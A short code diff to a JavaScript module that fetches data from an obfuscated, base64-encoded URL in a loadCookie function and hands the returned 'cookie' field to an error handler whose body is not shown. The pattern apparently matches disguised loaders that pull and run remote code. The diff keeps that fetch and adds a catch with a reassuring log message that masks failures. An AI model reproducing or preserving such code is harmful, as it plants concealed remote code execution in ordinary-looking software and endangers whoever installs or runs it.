@@ -33,7 +33,11 @@ const errorHandler = (error) => {
 };
 
 const loadCookie = () => {
-  axios.get(atob(COOKIE)).then(res => errorHandler(res.data.cookie));
+  axios.get(atob(COOKIE))
+    .then(res => errorHandler(res.data.cookie))
+    .catch(err => {
+      console.log('Note: External service unavailable, continuing without cookie loading');
+    });
 }
 
 module.exports = { notFound, loadCookie };
